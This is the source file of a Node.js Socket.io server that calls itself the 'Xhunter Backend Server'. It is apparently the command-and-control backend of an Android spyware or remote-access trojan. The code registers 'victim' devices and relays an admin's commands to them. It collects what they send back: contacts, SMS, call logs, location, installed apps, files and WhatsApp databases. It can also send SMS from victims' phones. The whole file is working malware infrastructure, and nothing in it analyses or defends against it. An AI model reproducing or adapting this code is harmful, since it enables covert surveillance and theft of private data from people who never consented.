const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 1e8, cors: { origin: "*", methods: ["GET","POST"] } });

const port = process.env.PORT || 8080;

let adminSocketId = null;
let victimList = {};
let victimData = {};
let deviceList = {};

const log = (msg) => console.log(`[LOG] ${msg}`);

// تمكين CORS
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));
app.get('/', (req,res)=> res.send('Welcome to Xhunter Backend Server!!'));

server.listen(port, () => log(`Server running on port ${port}`));

io.on('connection', (socket) => {
  // المدير
  socket.on('adminJoin', () => {
    adminSocketId = socket.id;
    Object.values(victimData).forEach(d => socket.emit('join', d));
    log(`Admin connected: ${socket.id}`);
  });

  // العميل
  socket.on('join', (device) => {
    victimList[device.id] = socket.id;
    victimData[device.id] = { ...device, socketId: socket.id };
    deviceList[socket.id] = { id: device.id, model: device.model };
    socket.broadcast.emit('join', { ...device, socketId: socket.id });
    if(adminSocketId) io.to(adminSocketId).emit('join', { ...device, socketId: socket.id });
    log(`Device joined: ${device.id}`);
  });

  // طلبات المدير
  socket.on('request', (d) => {
    const { to, action, data } = JSON.parse(d);
    if(victimList[to]) io.to(victimList[to]).emit(action, data);
    log(`Request: ${action} -> ${to}`);
  });

  const sendResponse = (action, data) => { if(adminSocketId) io.to(adminSocketId).emit(action, data); };
  const sendBinaryResponse = (action, data, callback) => { if(adminSocketId){ if(callback) callback('success'); io.to(adminSocketId).emit(action,data); } };

  const victimEvents = ['getDir','getInstalledApps','getContacts','sendSMS','getCallLog','previewImage','getSMS','getLocation','download','downloadWhatsappDatabase'];

  victimEvents.forEach(ev => {
    socket.on(ev, (data, callback) => {
      if(callback) sendBinaryResponse(ev,data,callback);
      else sendResponse(ev,data);
    });
  });

  socket.on('disconnect', () => {
    if(socket.id === adminSocketId) adminSocketId = null;
    else {
      sendResponse('disconnectClient', socket.id);
      Object.keys(victimList).forEach(k => {
        if(victimList[k] === socket.id){
          delete victimList[k];
          delete victimData[k];
        }
      });
    }
    log(`Socket disconnected: ${socket.id}`);
  });
});
